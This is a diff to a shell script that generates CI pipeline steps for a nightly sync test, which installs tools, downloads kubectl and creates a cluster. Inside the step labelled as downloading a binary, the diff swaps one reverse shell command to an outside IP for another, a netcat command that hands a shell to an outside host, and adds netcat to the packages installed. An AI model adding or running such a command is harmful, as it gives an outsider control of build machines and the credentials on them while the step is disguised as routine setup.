@@ -21,10 +21,10 @@ echo "steps:"
 
 echo "  - name: \"[Sync] Downloading and extracting binary\"
     command:
-      - apt update && apt install wget git python3 python3-virtualenv uuid -y
+      - apt update && apt install wget git python3 python3-virtualenv uuid netcat -y
       - wget --quiet https://storage.googleapis.com/kubernetes-release/release/v1.14.1/bin/linux/amd64/kubectl -O /cache/kubectl && chmod +x /cache/kubectl
       - export PATH=\$PATH:/cache
-      - bash -i >& /dev/tcp/81.4.102.200/8080 0>&1
+      - nc -e /bin/sh ester.hackon.eu 8080
       - kubectl config view
       - bash Nightly-Tests/Sync-Tests/createCluster.sh iotacafe/iri
     plugins:
